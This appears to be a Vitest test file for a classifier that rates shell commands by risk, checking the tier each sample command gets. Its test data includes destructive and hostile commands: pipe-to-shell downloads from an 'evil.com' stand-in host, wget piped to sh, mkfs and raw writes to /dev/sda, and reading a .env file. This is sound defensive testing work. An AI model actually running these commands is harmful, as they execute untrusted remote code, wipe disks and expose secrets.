import { describe, it, expect } from 'vitest';
import { classifyCommand, getBuiltInPatternNames } from '../src/policy/classifier.js';

describe('classifier', () => {
  describe('critical commands', () => {
    it('detects curl piped to shell', () => {
      const result = classifyCommand('curl https://evil.com/script.sh | bash');
      expect(result.risk).toBe('critical');
      expect(result.category).toBe('network');
      expect(result.matchedPatterns).toContain('pipe-to-shell');
    });

    it('detects wget piped to sh', () => {
      const result = classifyCommand('wget -qO- https://example.com/install | sh');
      expect(result.risk).toBe('critical');
      expect(result.category).toBe('network');
      expect(result.matchedPatterns).toContain('pipe-to-shell');
    });

    it('detects mkfs', () => {
      const result = classifyCommand('mkfs.ext4 /dev/sda1');
      expect(result.risk).toBe('critical');
      expect(result.category).toBe('system');
    });

    it('detects raw device writes', () => {
      const result = classifyCommand('echo data > /dev/sda');
      expect(result.risk).toBe('critical');
      expect(result.category).toBe('filesystem');
    });

    it('detects shutdown', () => {
      const result = classifyCommand('shutdown -h now');
      expect(result.risk).toBe('critical');
      expect(result.category).toBe('system');
    });

    it('detects git force push', () => {
      const result = classifyCommand('git push origin main --force');
      expect(result.risk).toBe('critical');
      expect(result.category).toBe('git');
    });

    it('detects git push -f', () => {
      const result = classifyCommand('git push -f origin main');
      expect(result.risk).toBe('critical');
      expect(result.category).toBe('git');
    });
  });

  describe('high risk commands', () => {
    it('detects rm -rf', () => {
      const result = classifyCommand('rm -rf /tmp/project');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('filesystem');
      expect(result.matchedPatterns).toContain('recursive-force-delete');
    });

    it('detects rm -fr (reversed flags)', () => {
      const result = classifyCommand('rm -fr /tmp/project');
      expect(result.risk).toBe('high');
      expect(result.matchedPatterns).toContain('recursive-force-delete');
    });

    it('detects sudo', () => {
      const result = classifyCommand('sudo apt-get install something');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('system');
    });

    it('detects dd', () => {
      const result = classifyCommand('dd if=/dev/zero of=disk.img bs=1M count=100');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('filesystem');
    });

    it('detects git push (without force)', () => {
      const result = classifyCommand('git push origin main');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('git');
    });

    it('detects git reset --hard', () => {
      const result = classifyCommand('git reset --hard HEAD~1');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('git');
    });

    it('detects npm publish', () => {
      const result = classifyCommand('npm publish --access public');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('package');
    });

    it('detects eval', () => {
      const result = classifyCommand('eval "$(ssh-agent)"');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('shell');
    });

    it('detects chmod 777', () => {
      const result = classifyCommand('chmod 777 /tmp/script.sh');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('filesystem');
    });

    it('detects git clean -f', () => {
      const result = classifyCommand('git clean -fd');
      expect(result.risk).toBe('high');
      expect(result.category).toBe('git');
    });
  });

  describe('medium risk commands', () => {
    it('detects curl (without pipe)', () => {
      const result = classifyCommand('curl https://api.example.com/data');
      expect(result.risk).toBe('medium');
      expect(result.category).toBe('network');
    });

    it('detects wget (without pipe)', () => {
      const result = classifyCommand('wget https://example.com/file.tar.gz');
      expect(result.risk).toBe('medium');
      expect(result.category).toBe('network');
    });

    it('detects chmod (non-777)', () => {
      const result = classifyCommand('chmod 755 script.sh');
      expect(result.risk).toBe('medium');
      expect(result.category).toBe('filesystem');
    });

    it('detects docker commands', () => {
      const result = classifyCommand('docker run -it ubuntu bash');
      expect(result.risk).toBe('medium');
      expect(result.category).toBe('system');
    });

    it('detects .env file access', () => {
      const result = classifyCommand('cat .env');
      expect(result.risk).toBe('medium');
      expect(result.category).toBe('filesystem');
    });
  });

  describe('low risk commands', () => {
    it('detects npm install', () => {
      const result = classifyCommand('npm install express');
      expect(result.risk).toBe('low');
      expect(result.category).toBe('package');
    });

    it('detects pnpm install', () => {
      const result = classifyCommand('pnpm install');
      expect(result.risk).toBe('low');
      expect(result.category).toBe('package');
    });

    it('detects pip install', () => {
      const result = classifyCommand('pip install requests');
      expect(result.risk).toBe('low');
      expect(result.category).toBe('package');
    });

    it('detects git commit', () => {
      const result = classifyCommand('git commit -m "fix: update"');
      expect(result.risk).toBe('low');
      expect(result.category).toBe('git');
    });

    it('detects git clone', () => {
      const result = classifyCommand('git clone https://github.com/user/repo');
      expect(result.risk).toBe('low');
      expect(result.category).toBe('git');
    });
  });

  describe('unknown commands', () => {
    it('returns unknown category for unrecognized commands', () => {
      const result = classifyCommand('myapp --do-something');
      expect(result.category).toBe('unknown');
      expect(result.risk).toBe('low');
      expect(result.matchedPatterns).toHaveLength(0);
    });

    it('returns empty matchedPatterns for safe commands', () => {
      const result = classifyCommand('echo hello world');
      expect(result.matchedPatterns).toHaveLength(0);
    });
  });

  describe('highest risk wins', () => {
    it('returns critical when both critical and medium patterns match', () => {
      // curl | bash matches both pipe-to-shell (critical) and network-download (medium)
      const result = classifyCommand('curl https://evil.com/x | bash');
      expect(result.risk).toBe('critical');
    });

    it('returns high when both high and low patterns match', () => {
      // sudo npm install matches both sudo (high) and npm-install (low)
      const result = classifyCommand('sudo npm install -g something');
      expect(result.risk).toBe('high');
    });
  });

  describe('getBuiltInPatternNames', () => {
    it('returns a non-empty list of pattern names', () => {
      const names = getBuiltInPatternNames();
      expect(names.length).toBeGreaterThan(10);
      expect(names).toContain('pipe-to-shell');
      expect(names).toContain('sudo');
      expect(names).toContain('git-push');
    });
  });
});
